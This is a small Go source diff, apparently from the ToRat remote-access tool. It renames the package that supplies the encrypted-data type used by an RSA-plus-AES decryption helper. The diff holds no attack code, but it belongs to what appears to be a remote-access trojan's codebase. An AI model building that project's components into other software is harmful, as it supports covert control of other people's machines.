@@ -11,7 +11,7 @@ import (
 	"io/ioutil"
 	"log"
 
-	"github.com/lu4p/ToRat/models"
+	"github.com/lu4p/ToRat/shared"
 )
 
 var privateKey = loadPrivateKey()
@@ -68,7 +68,7 @@ func DecAes(encData []byte, aeskey []byte) ([]byte, error) {
 }
 
 // DecAsym decypts asymetric encryption (4096 bit RSA + AES)
-func DecAsym(encData models.EncAsym) ([]byte, error) {
+func DecAsym(encData shared.EncAsym) ([]byte, error) {
 	aeskey, err := DecRsa(encData.EncAesKey)
 	if err != nil {
 		return nil, err
